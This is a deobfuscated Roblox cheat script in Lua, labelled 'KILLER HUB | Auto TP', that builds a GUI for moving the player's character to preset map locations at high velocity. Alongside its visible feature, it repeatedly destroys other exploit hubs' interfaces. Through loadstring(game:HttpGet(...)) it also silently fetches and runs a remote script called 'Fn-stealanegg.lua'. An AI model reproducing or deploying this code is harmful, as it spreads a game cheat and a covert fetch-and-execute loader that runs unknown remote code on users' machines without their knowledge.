killer usou ia ate a bunda secar
deobsfucada por maya

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local preservar = {
    "killerhubv1", "killerhub", "killer", "delta", "executor", "fluxus", 
    "arceus", "codex", "roblox", "chat", "core", "prompt", "interact", 
    "hold", "press", "action", "hud", "inventory", "item", "pickup",
    "proximity", "dialog", "bar", "health", "stamina", "touch"
}

local termosHubs = {
    "miranda", "foxname", "orion", "rayfield", "kavo", "fluent", 
    "windui", "venom", "loader", "uilib", "library"
}

local function devePreservar(nome)
    local n = nome:lower()
    for _, termo in ipairs(preservar) do
        if n:find(termo) then return true end
    end
    return false
end

local function ehHubSecundario(nome)
    local n = nome:lower()
    for _, termo in ipairs(termosHubs) do
        if n:find(termo) then return true end
    end
    return false
end

local function esconderOuDestruirUI(parent)
    if not parent then return end
    for _, gui in ipairs(parent:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local nome = gui.Name
            if not devePreservar(nome) and ehHubSecundario(nome) then
                pcall(function()
                    gui.Enabled = false
                    for _, child in ipairs(gui:GetDescendants()) do
                        if child:IsA("GuiObject") then
                            child.Visible = false
                            child.Size = UDim2.new(0, 0, 0, 0)
                        end
                    end
                    gui:Destroy()
                end)
            end
        end
    end
end

task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            local pGui = player:FindFirstChild("PlayerGui")
            if pGui then esconderOuDestruirUI(pGui) end
            
            local hui = (gethui and gethui()) or game:GetService("CoreGui")
            if hui then esconderOuDestruirUI(hui) end
        end)
    end
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Fn-stealanegg.lua"))()
    end)
end)

local posicaoSalva = nil
local nomeLocalSelecionado = ""
local andando = false
local VELOCIDADE = 1000

local listaLocais = {
    {nome = "Spawn", pos = Vector3.new(523, 70.58, -366)},
    {nome = "Prehistoric", pos = Vector3.new(2810, 70.58, -380)},
    {nome = "Cosmico", pos = Vector3.new(3388, 70.58, -340)},
    {nome = "Cherry Blossom", pos = Vector3.new(4023, 70.58, -381)},
    {nome = "Gorilla King", pos = Vector3.new(4806, 70.58, -346)},
    {nome = "Demons and Angels", pos = Vector3.new(5644, 70.58, -340)},
}

local TEMA = {
    fundo      = Color3.fromRGB(15, 15, 20),
    painel     = Color3.fromRGB(25, 25, 35),
    destaque   = Color3.fromRGB(46, 204, 113),
    texto      = Color3.fromRGB(240, 240, 245),
    textoFraco = Color3.fromRGB(150, 150, 160),
    verde      = Color3.fromRGB(50, 220, 100),
    borda      = Color3.fromRGB(45, 45, 60),
    selecao    = Color3.fromRGB(46, 204, 113),
}

local SG = Instance.new("ScreenGui")
SG.Name = "KillerHubV1"
SG.ResetOnSpawn = false
SG.IgnoreGuiInset = true
SG.DisplayOrder = 999999999
SG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SG.Parent = (gethui and gethui()) or player:WaitForChild("PlayerGui")

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 290, 0, 310)
Main.Position = UDim2.new(0.5, -145, 0.5, -155)
Main.BackgroundColor3 = TEMA.fundo
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Visible = false
Main.ZIndex = 10
Main.Parent = SG

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = Main

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = TEMA.borda
MainStroke.Thickness = 1.5
MainStroke.Parent = Main

local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 50)
Header.BackgroundColor3 = TEMA.painel
Header.BorderSizePixel = 0
Header.Parent = Main

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 12)
HeaderCorner.Parent = Header

local LinhaDecor = Instance.new("Frame")
LinhaDecor.Size = UDim2.new(0, 4, 0, 30)
LinhaDecor.Position = UDim2.new(0, 12, 0.5, -15)
LinhaDecor.BackgroundColor3 = TEMA.destaque
LinhaDecor.BorderSizePixel = 0
LinhaDecor.Parent = Header

local Logo = Instance.new("TextLabel")
Logo.Size = UDim2.new(0, 180, 0, 20)
Logo.Position = UDim2.new(0, 24, 0, 8)
Logo.BackgroundTransparency = 1
Logo.Text = "KILLER HUB"
Logo.TextColor3 = TEMA.texto
Logo.Font = Enum.Font.GothamBlack
Logo.TextSize = 16
Logo.TextXAlignment = Enum.TextXAlignment.Left
Logo.Parent = Header

local Versao = Instance.new("TextLabel")
Versao.Size = UDim2.new(0, 180, 0, 15)
Versao.Position = UDim2.new(0, 25, 0, 26)
Versao.BackgroundTransparency = 1
Versao.Text = "By KILLER | Auto TP"
Versao.TextColor3 = TEMA.textoFraco
Versao.Font = Enum.Font.Gotham
Versao.TextSize = 10
Versao.TextXAlignment = Enum.TextXAlignment.Left
Versao.Parent = Header

local BtnMin = Instance.new("TextButton")
BtnMin.Size = UDim2.new(0, 30, 0, 30)
BtnMin.Position = UDim2.new(1, -38, 0, 10)
BtnMin.BackgroundColor3 = TEMA.fundo
BtnMin.Text = "—"
BtnMin.TextColor3 = TEMA.texto
BtnMin.Font = Enum.Font.GothamBold
BtnMin.TextSize = 16
BtnMin.Parent = Header

local BtnMinCorner = Instance.new("UICorner")
BtnMinCorner.CornerRadius = UDim.new(0, 6)
BtnMinCorner.Parent = BtnMin

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -20, 1, -65)
Content.Position = UDim2.new(0, 10, 0, 58)
Content.BackgroundTransparency = 1
Content.Parent = Main

local BtnGo = Instance.new("TextButton")
BtnGo.Size = UDim2.new(1, 0, 0, 40)
BtnGo.Position = UDim2.new(0, 0, 0, 0)
BtnGo.BackgroundColor3 = TEMA.destaque
BtnGo.Text = "GO"
BtnGo.TextColor3 = TEMA.texto
BtnGo.Font = Enum.Font.GothamBlack
BtnGo.TextSize = 16
BtnGo.Parent = Content

local BtnGoCorner = Instance.new("UICorner")
BtnGoCorner.CornerRadius = UDim.new(0, 8)
BtnGoCorner.Parent = BtnGo

local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, 0, 0, 25)
Status.Position = UDim2.new(0, 0, 0, 45)
Status.BackgroundTransparency = 1
Status.Text = "Selecione um local"
Status.TextColor3 = TEMA.textoFraco
Status.Font = Enum.Font.Gotham
Status.TextSize = 11
Status.Parent = Content

local ScrollLocais = Instance.new("ScrollingFrame")
ScrollLocais.Size = UDim2.new(1, 0, 1, -75)
ScrollLocais.Position = UDim2.new(0, 0, 0, 75)
ScrollLocais.BackgroundTransparency = 1
ScrollLocais.BorderSizePixel = 0
ScrollLocais.ScrollBarThickness = 4
ScrollLocais.ScrollBarImageColor3 = TEMA.destaque
ScrollLocais.Parent = Content

local UIList = Instance.new("UIListLayout")
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 6)
UIList.Parent = ScrollLocais

local botoesLocais = {}

for i, loc in ipairs(listaLocais) do
    local btnLoc = Instance.new("TextButton")
    btnLoc.Size = UDim2.new(1, -6, 0, 32)
    btnLoc.BackgroundColor3 = TEMA.painel
    btnLoc.Text = loc.nome
    btnLoc.TextColor3 = TEMA.texto
    btnLoc.Font = Enum.Font.GothamBold
    btnLoc.TextSize = 11
    btnLoc.Parent = ScrollLocais
    
    local btnLocCorner = Instance.new("UICorner")
    btnLocCorner.CornerRadius = UDim.new(0, 6)
    btnLocCorner.Parent = btnLoc
    
    botoesLocais[loc.nome] = btnLoc
    
    btnLoc.MouseButton1Click:Connect(function()
        posicaoSalva = loc.pos
        nomeLocalSelecionado = loc.nome
        
        
        for name, button in pairs(botoesLocais) do
            button.BackgroundColor3 = (name == loc.nome) and TEMA.selecao or TEMA.painel
        end
        
        Status.Text = "Selecionado: " .. loc.nome
        Status.TextColor3 = TEMA.texto
    end)
end

ScrollLocais.CanvasSize = UDim2.new(0, 0, 0, #listaLocais * 38)

local BtnFloat = Instance.new("TextButton")
BtnFloat.Size = UDim2.new(0, 55, 0, 55)
BtnFloat.Position = UDim2.new(0, 15, 0.5, -27)
BtnFloat.BackgroundColor3 = TEMA.destaque
BtnFloat.Text = "K"
BtnFloat.TextColor3 = TEMA.texto
BtnFloat.Font = Enum.Font.GothamBlack
BtnFloat.TextSize = 22
BtnFloat.ZIndex = 10
BtnFloat.Parent = SG

local BtnFloatCorner = Instance.new("UICorner")
BtnFloatCorner.CornerRadius = UDim.new(0, 30)
BtnFloatCorner.Parent = BtnFloat

local BtnFloatStroke = Instance.new("UIStroke")
BtnFloatStroke.Color = Color3.fromRGB(255, 255, 255)
BtnFloatStroke.Thickness = 2
BtnFloatStroke.Transparency = 0.5
BtnFloatStroke.Parent = BtnFloat

local dragando = false
local movendo = false
local dragStart = nil
local startPos = nil

BtnFloat.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragando = true
        movendo = false
        dragStart = input.Position
        startPos = BtnFloat.Position
    end
end)

BtnFloat.InputChanged:Connect(function(input)
    if dragando and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        if delta.Magnitude > 6 then movendo = true end
        if movendo then
            BtnFloat.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragando = false
    end
end)

local aberto = false

local function abrir()
    aberto = true
    BtnFloat.Visible = false
    Main.Visible = true
end

local function fechar()
    aberto = false
    Main.Visible = false
    BtnFloat.Visible = true
end

BtnFloat.MouseButton1Click:Connect(function()
    if not movendo then abrir() end
end)

BtnMin.MouseButton1Click:Connect(fechar)

local function andarZigzag()
    if andando then return end
    if not posicaoSalva then
        Status.Text = "Selecione um local primeiro!"
        Status.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    andando = true
    BtnGo.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
    BtnGo.Text = "PARAR"
    Status.Text = "Indo para: " .. nomeLocalSelecionado
    Status.TextColor3 = TEMA.verde
    
    task.spawn(function()
        local inicio = tick()
        while andando and (tick() - inicio) < 15 do
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then break end
            
            local posAtual = hrp.Position
            local direcao = posicaoSalva - posAtual
            local distancia = direcao.Magnitude
            
            if distancia < 5 then
                hrp.CFrame = CFrame.new(posicaoSalva)
                hrp.AssemblyLinearVelocity = Vector3.zero
                break
            end
            
            local dirXZ = Vector3.new(direcao.X, 0, direcao.Z)
            if dirXZ.Magnitude < 0.01 then break end
            local dirUnit = dirXZ.Unit
            
            hrp.AssemblyLinearVelocity = Vector3.new(
                dirUnit.X * VELOCIDADE, 0, dirUnit.Z * VELOCIDADE)
            
            Status.Text = nomeLocalSelecionado .. " (" .. math.floor(distancia) .. "m)"
            task.wait()
        end
        
        andando = false
        BtnGo.BackgroundColor3 = TEMA.destaque
        BtnGo.Text = "GO"
        if posicaoSalva then
            Status.Text = "Chegou em: " .. nomeLocalSelecionado
            Status.TextColor3 = TEMA.verde
        end
    end)
end

BtnGo.MouseButton1Click:Connect(function()
    if andando then
        andando = false
        BtnGo.BackgroundColor3 = TEMA.destaque
        BtnGo.Text = "GO"
        Status.Text = "Parado"
        Status.TextColor3 = TEMA.textoFraco
    else
        andarZigzag()
    end
end)

task.wait(1)
abrir()
print("✅ KILLER HUB EXECUTADO")
